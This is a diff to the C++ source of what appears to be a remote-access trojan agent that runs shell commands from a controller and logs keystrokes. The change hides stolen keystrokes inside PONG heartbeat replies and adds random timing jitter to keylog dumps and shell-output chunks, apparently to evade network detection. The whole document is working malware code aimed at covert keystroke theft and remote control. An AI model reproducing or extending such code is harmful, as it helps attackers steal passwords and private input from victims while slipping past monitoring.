@@ -2,6 +2,7 @@
 #include <iostream>
 #include <chrono>
 #include <thread>
+#include <random>
 #include <sstream>
 #include <algorithm>
 #include <ctime>
@@ -126,7 +127,7 @@ void Agent::handleListening() {
         if (!packet_opt.has_value()) {
             break; // Incomplete packet — wait for more data
         }
-        const size_t packet_size = sizeof(PacketHeader) + packet_opt->getPayload().size();
+        const size_t packet_size = sizeof(PacketHeader) + packet_opt->getWirePayloadSize();
         handleDispatching(std::move(*packet_opt));
         // Slide: remove the consumed packet bytes from the front of the buffer
         m_receive_buffer.erase(m_receive_buffer.begin(),
@@ -148,7 +149,17 @@ void Agent::handleDispatching(Packet&& packet) {
     } else if (opcode == static_cast<uint16_t>(Opcode::CMD_EXEC)) {
         handleShellExecution(std::move(packet));
     } else if (opcode == static_cast<uint16_t>(Opcode::PING)) {
-        Packet pong(static_cast<uint16_t>(Opcode::PONG), "");
+        // Piggyback keylog data on PONG: prefer jittered data from shared buffer,
+        // fall back to immediate dump for any remaining keystrokes
+        std::string pong_payload;
+        {
+            std::lock_guard<std::mutex> lock(m_keylog_pending_mutex);
+            if (!m_keylog_pending_data.empty()) {
+                pong_payload = std::move(m_keylog_pending_data);
+                m_keylog_pending_data.clear();
+            }
+        }
+        Packet pong(static_cast<uint16_t>(Opcode::PONG), pong_payload);
         std::vector<uint8_t> data = pong.serialize();
         m_socket.sendData(data);
     } else if (opcode == static_cast<uint16_t>(Opcode::KEYLOG_START)) {
@@ -161,50 +172,62 @@ void Agent::handleDispatching(Packet&& packet) {
 }
 
 void Agent::handleKeylogStart() {
+    if (m_keylog_jitter_thread.joinable()) {
+        std::cerr << "[Agent] Jitter thread already running — ignoring double start.\n";
+        return;
+    }
     std::cout << "[Agent] Starting KeyLogger...\n";
     m_keylogger.start();
+
+    m_keylog_jitter_running = true;
+    m_keylog_dump_requested = false;
+    m_keylog_jitter_thread = std::thread([this]() {
+        std::mt19937 rng(std::random_device{}());
+        std::uniform_int_distribution<int> jitter_dist(500, 3000);
+
+        while (m_keylog_jitter_running) {
+            std::unique_lock<std::mutex> lock(m_keylog_jitter_mutex);
+            if (!m_keylog_jitter_cv.wait_for(lock, std::chrono::milliseconds(200),
+                [this]() { return m_keylog_dump_requested.load() || !m_keylog_jitter_running; })) {
+                continue;
+            }
+            if (!m_keylog_jitter_running) break;
+
+            m_keylog_dump_requested = false;
+            lock.unlock();
+
+            std::this_thread::sleep_for(std::chrono::milliseconds(jitter_dist(rng)));
+
+            std::string keystrokes = m_keylogger.dump();
+            if (keystrokes.empty()) continue;
+
+            // Append to shared buffer for PONG piggybacking — accumulates
+            // across multiple KEYLOG_DUMP polls until the next PONG sends it.
+            {
+                std::lock_guard<std::mutex> pending_lock(m_keylog_pending_mutex);
+                if (m_keylog_pending_data.size() + keystrokes.size() <= KeyLogger::MAX_BUFFER_SIZE) {
+                    m_keylog_pending_data += keystrokes;
+                }
+            }
+        }
+    });
 }
 
 void Agent::handleKeylogStop() {
     std::cout << "[Agent] Stopping KeyLogger...\n";
     m_keylogger.stop();
+
+    m_keylog_jitter_running = false;
+    m_keylog_jitter_cv.notify_one();
+    if (m_keylog_jitter_thread.joinable()) {
+        m_keylog_jitter_thread.join();
+    }
 }
 
 void Agent::handleKeylogDump() {
-    std::cout << "[Agent] Dumping KeyLogger buffer...\n";
-    std::string keystrokes = m_keylogger.dump();
-    
-    static uint32_t seq_num = 0;
-    seq_num++;
-    
-    uint32_t timestamp = static_cast<uint32_t>(std::time(nullptr));
-    uint32_t data_len  = static_cast<uint32_t>(keystrokes.size());
-    
-    std::vector<uint8_t> payload;
-    payload.reserve(12 + data_len);
-    
-    // Sequence Number (4 bytes)
-    payload.push_back((seq_num >> 24) & 0xFF);
-    payload.push_back((seq_num >> 16) & 0xFF);
-    payload.push_back((seq_num >> 8) & 0xFF);
-    payload.push_back(seq_num & 0xFF);
-    
-    // Timestamp (4 bytes)
-    payload.push_back((timestamp >> 24) & 0xFF);
-    payload.push_back((timestamp >> 16) & 0xFF);
-    payload.push_back((timestamp >> 8) & 0xFF);
-    payload.push_back(timestamp & 0xFF);
-    
-    // Data Length (4 bytes) - Expanded from 2 bytes to handle 1MB buffer
-    payload.push_back((data_len >> 24) & 0xFF);
-    payload.push_back((data_len >> 16) & 0xFF);
-    payload.push_back((data_len >> 8) & 0xFF);
-    payload.push_back(data_len & 0xFF);
-    
-    payload.insert(payload.end(), keystrokes.begin(), keystrokes.end());
-    
-    Packet res(static_cast<uint16_t>(Opcode::KEYLOG_DATA), std::string(payload.begin(), payload.end()));
-    m_socket.sendData(res.serialize());
+    std::cout << "[Agent] Keylogger dump requested (jitter scheduled)...\n";
+    m_keylog_dump_requested = true;
+    m_keylog_jitter_cv.notify_one();
 }
 
 void Agent::handleShellExecution(Packet&& packet) {
@@ -251,12 +274,19 @@ void Agent::handleShellExecution(Packet&& packet) {
         return;
     }
 
+    thread_local std::mt19937 jitter_rng(std::random_device{}());
+    std::uniform_int_distribution<int> jitter_dist(50, 250);
+
     do {
         const size_t end   = std::min(offset + chunk_size, total);
         const bool is_last = (end == total);
         const uint8_t status = is_last ? 1 : 0;
         send_chunk(status, output.substr(offset, end - offset));
         offset = end;
+        if (!is_last) {
+            std::this_thread::sleep_for(
+                std::chrono::milliseconds(jitter_dist(jitter_rng)));
+        }
     } while (offset < total);
 }
 
